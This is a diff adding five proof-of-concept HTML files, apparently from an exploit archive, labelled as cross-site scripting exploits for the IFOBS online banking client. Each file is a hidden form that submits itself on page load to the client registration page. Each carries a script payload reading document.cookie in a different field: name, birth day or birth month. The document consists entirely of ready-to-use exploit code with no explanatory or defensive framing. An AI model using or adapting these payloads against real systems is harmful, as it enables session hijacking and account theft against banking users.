@@ -1,0 +1,90 @@
+IFOBS XSS-11.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive.
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientform.jsp";
+method="post">
+<input type="hidden" name="secondName"
+value='"><script>alert(document.cookie)</script>'>
+</form>
+</body>
+</html>
+
+IFOBS XSS-12.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive.
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientform.jsp";
+method="post">
+<input type="hidden" name="firstName"
+value='"><script>alert(document.cookie)</script>'>
+</form>
+</body>
+</html>
+
+IFOBS XSS-13.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive.
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientform.jsp";
+method="post">
+<input type="hidden" name="thirdName"
+value='"><script>alert(document.cookie)</script>'>
+</form>
+</body>
+</html>
+
+IFOBS XSS-14.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive.
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientform.jsp";
+method="post">
+<input type="hidden" name="BirthDay"
+value='</script><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthMonth" value="01">
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
+
+IFOBS XSS-15.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive.
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientform.jsp";
+method="post">
+<input type="hidden" name="BirthDay" value="01">
+<input type="hidden" name="BirthMonth"
+value='</script><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
